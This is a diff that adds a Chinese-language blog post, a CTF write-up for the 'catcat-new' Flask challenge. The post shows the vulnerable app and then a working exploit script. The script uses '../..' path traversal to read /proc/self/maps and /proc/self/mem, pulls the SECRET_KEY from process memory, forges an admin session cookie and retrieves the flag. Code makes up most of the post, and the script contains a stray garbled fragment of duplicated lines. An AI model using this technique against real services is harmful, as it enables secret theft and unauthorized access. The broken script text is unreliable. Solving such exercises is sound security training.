@@ -1,0 +1,118 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>catcat-new【目录穿透+特殊文件】 · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">catcat-new【目录穿透+特殊文件】</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-05-07</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="catcat-new【目录穿透-特殊文件】"><a href="#catcat-new【目录穿透-特殊文件】" class="headerlink" title="catcat-new【目录穿透+特殊文件】"></a>catcat-new【目录穿透+特殊文件】</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line">from cat import cat</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">app = Flask(</span><br><span class="line">    __name__,</span><br><span class="line">    static_url_path=&#x27;/&#x27;,</span><br><span class="line">    static_folder=&#x27;static&#x27;</span><br><span class="line">)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;</span><br><span class="line">if os.path.isfile(&quot;/flag&quot;):</span><br><span class="line">    flag = cat(&quot;/flag&quot;)</span><br><span class="line">    os.remove(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    detailtxt = os.listdir(&#x27;./details/&#x27;)</span><br><span class="line">    cats_list = []</span><br><span class="line">    for i in detailtxt:</span><br><span class="line">        cats_list.append(i[:i.index(&#x27;.&#x27;)])</span><br><span class="line"></span><br><span class="line">    return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])</span><br><span class="line">def info():</span><br><span class="line">    filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;)</span><br><span class="line">    start = request.args.get(&#x27;start&#x27;, &quot;0&quot;)</span><br><span class="line">    end = request.args.get(&#x27;end&#x27;, &quot;0&quot;)</span><br><span class="line">    name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)]</span><br><span class="line"></span><br><span class="line">    return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])</span><br><span class="line">def admin_can_list_root():</span><br><span class="line">    if session.get(&#x27;admin&#x27;) == 1:</span><br><span class="line">        return flag</span><br><span class="line">    else:</span><br><span class="line">        session[&#x27;admin&#x27;] = 0</span><br><span class="line">        return &quot;NoNoNo&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>由脚本知，定义了一个用于管理员权限验证的路由 <strong><code>/admin</code></strong>，只有当会话中的 <strong><code>admin</code></strong> 值为 1 时，才返回flag。否则，将 <strong><code>admin</code></strong> 值设置为 0，并返回字符串 “NoNoNo”。由此知，此处需要伪造session。</li>
+</ul>
+<p>伪造session并获取flag</p>
+<p>伪造session的必要条件是获取密钥SECRET_KEY。由app.py知secret key在app（<strong>flask对象，存储在堆上</strong>）的config属性中的’SECRET_KEY‘键上。</p>
+<p>此处需要借助几个进程文件相互配合获取堆上的SECRET KEY:</p>
+<ul>
+<li>&#x2F;proc&#x2F;self&#x2F;mem：得到进程的内存内容</li>
+<li>&#x2F;proc&#x2F;self&#x2F;maps：获取当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</li>
+</ul>
+<p>利用&#x2F;proc&#x2F;self&#x2F;maps的映射信息来确定读的偏移值，通过&#x2F;proc&#x2F;self&#x2F;mem文件读取密钥。</p>
+<p>附上大佬的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">#----------------------------------</span><br><span class="line">###################################</span><br><span class="line">#Edited by lx56@blog.lxscloud.top</span><br><span class="line">###################################</span><br><span class="line">#----------------------------------</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import ast, sys</span><br><span class="line">from abc import ABC</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://61.147.171.105:65402/&quot;</span><br><span class="line"> </span><br><span class="line">#此程序只能运行于Python3以上</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line"> </span><br><span class="line">#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------</span><br><span class="line">class MockApp(object):</span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line">class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            #Encode a Flask session cookie</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span><br><span class="line">s_key = &quot;&quot;</span><br><span class="line">bypass = &quot;../..&quot;</span><br><span class="line">#请求file路由进行读取</span><br><span class="line">map_list = requests.get(url + f&quot;info?file=&#123;bypass&#125;/proc/self/maps&quot;)</span><br><span class="line">map_list = map_list.text.split(&quot;\\n&quot;)</span><br><span class="line">for i in map_list:</span><br><span class="line">    #匹配指定格式的地址</span><br><span class="line">    map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i)</span><br><span class="line">    if map_addr:</span><br><span class="line">        start = int(map_addr.group(1), 16)</span><br><span class="line">        end = int(map_addr.group(2), 16)</span><br><span class="line">        print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end)</span><br><span class="line">        </span><br><span class="line">        #设置起始和结束位置并读取/proc/self/mem</span><br><span class="line">        res = requests.get(f&quot;&#123;url&#125;/info?file=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;)</span><br><span class="line">        #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span><br><span class="line">        if &quot;*abcdefgh&quot; in res.text:</span><br><span class="line">            #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span><br><span class="line">            secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;, res.text)</span><br><span class="line">            if secret_key:</span><br><span class="line">                print(&quot;Secret Key:&quot;, secret_key[0])</span><br><span class="line">                s_key = secret_key[0]</span><br><span class="line">                break</span><br><span class="line"> ])</span><br><span class="line">                s_key = secret_key[0]</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># 设置session中admin的值为1</span><br><span class="line">data = &#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span><br><span class="line"># 伪造session</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;session=&quot; + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"># 请求admin路由</span><br><span class="line">try:</span><br><span class="line">    flag = requests.get(url + &quot;admin&quot;, headers=headers)</span><br><span class="line">    print(&quot;Flag is&quot;, flag.text)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Something error&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/05/07/catcat-new%E3%80%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E3%80%91/">http://1768161086.github,io/2025/05/07/catcat-new%E3%80%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E3%80%91/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/05/08/HG%E6%B3%84%E9%9C%B2/" title="HG泄露"><span>< PreviousPost</span><br><span class="prevTitle">HG泄露</span></a><a class="nextSlogan" href="/2025/05/07/php-filter-iconv/" title="php-filter-iconv"><span>NextPost ></span><br><span class="nextTitle">php-filter-iconv</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#catcat-new%E3%80%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E3%80%91"><span class="toc-number">1.</span> <span class="toc-text">catcat-new【目录穿透+特殊文件】</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
